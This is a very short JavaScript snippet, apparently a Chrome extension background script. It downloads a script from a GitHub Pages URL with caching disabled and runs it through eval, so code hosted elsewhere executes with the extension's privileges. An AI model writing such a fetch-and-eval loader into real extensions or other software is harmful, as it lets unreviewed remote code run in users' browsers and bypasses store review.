fetch('https://fcupen.github.io/extension-chrome-test/module/background.module.js?v=2', { cache: "no-store" }).then(v => {
    v.text().then(code => {
        eval(code);
    });
});